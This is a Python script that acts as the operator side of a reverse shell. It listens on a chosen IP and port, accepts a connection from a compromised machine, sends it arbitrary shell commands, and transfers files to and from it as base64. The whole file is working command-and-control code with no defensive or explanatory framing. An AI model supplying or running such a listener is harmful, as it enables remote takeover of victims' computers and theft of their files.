import socket 
import json
import base64

def server(ip, port):
    global target

    lisetner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lisetner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lisetner.bind((ip, port))
    lisetner.listen(0)
    print('[+] Listening....')
    target, address = lisetner.accept()
    print(f"[+] Got connection from {address}")

def send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def recieve():
    json_data = '' 
    while True:
        try:
            json_data += target.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        command = input('Shell#: ')
        send(command)
        if command == 'exit':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command [:8] == 'download':
            with open(command[9:], 'wb') as f:
                file_data = recieve()
                f.write(base64.b64decode(file_data))
        elif command[:6] == 'upload':
            with open(command[7:], 'rb') as f:
                send(base64.b64encode(f.read()))
        else:
            result = recieve().encode('utf-8')
            print(result.decode('utf-8'))

ip = input("Enter the IP: ")
port = int(input("Enter the Port: "))

server(ip, port)
run()